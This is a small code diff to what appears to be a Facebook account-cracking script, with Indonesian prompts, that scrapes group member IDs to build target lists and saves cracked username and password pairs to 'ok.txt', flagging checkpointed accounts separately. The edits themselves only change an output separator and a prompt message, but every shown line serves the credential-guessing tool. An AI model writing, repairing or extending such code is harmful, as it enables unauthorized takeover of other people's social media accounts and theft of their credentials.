@@ -180,7 +180,7 @@ def mbfv2():
                         life.append(username+"[▪]"+password)
                  else:
                         with open('ok.txt','a') as f:
-                                f.write(username + '|' + password + '\n')
+                                f.write(username + '[▪]' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
                    print(f"\r\033[1;93m  * 👉 {username}[▪]{password}                    ",end="")
                    print()
@@ -313,7 +313,7 @@ def mbfv2():
                          if len(username) == 0:
                                  exit("\033[90m[\033[91m!\033[90m] \033[91mNama Pengguna tidak ditemukan!")
                    elif kentang == '4' or kentang =='04':
-                         print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
+                         print("\033[1;97m\n [\033[1;94m▪▪\033[1;97m] Harap di isi \033[91m100 \033[00mID Grup ")
                          grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[93mMasukin ID Grup \033[1;91m: \033[1;92m")
                          username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                          if len(username) == 0:
